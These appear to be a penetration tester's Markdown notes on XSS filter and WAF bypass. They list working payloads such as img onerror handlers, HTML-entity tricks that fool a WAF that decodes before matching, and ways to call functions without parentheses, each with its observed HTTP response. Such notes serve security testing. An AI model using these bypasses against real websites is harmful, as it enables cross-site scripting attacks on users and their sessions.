# alert, prompt, etc are filtered

## fuzz to find a valid tag

## `<ta{FUZZ}g>`

  related to [fuzz JavaScript scheme](fuzz JS schemes)?

## WAF confusion

### example payloads

```
<img src="/" =_=" title="onerror='prompt(origin)'">
<--` <img/src=` onerror=alert(origin)> --!> // to assuem it's a comment
<!\script>confirm(origin)</script>
```

### html encoding to bypass the WAF

- `<img src onerror=alert(1)>` // 403
  `<img src>` // 200
  `<img src> onerror=alert(1)` // 200
  so we infer it's the problem with stuff being inside the angle bracket.

- `<img src &#x3E onerror=alert(1)>` // 200
  client --> WAF --> html decode --> rule set

  so WAF first html decode stuff, figures out the tag is closed, so it will return 200.
  but on the browser it doesn't matter what the string is just a random meaningless
  string, --> `onerror` will be triggered.

# parenthesis, brackets, func(), etc are filtered

`1234()` // 200
`alert()` // 403 --> () are blocked

`alert?.()` // 200
`window.valueOf=alert;winodow+1` // 200
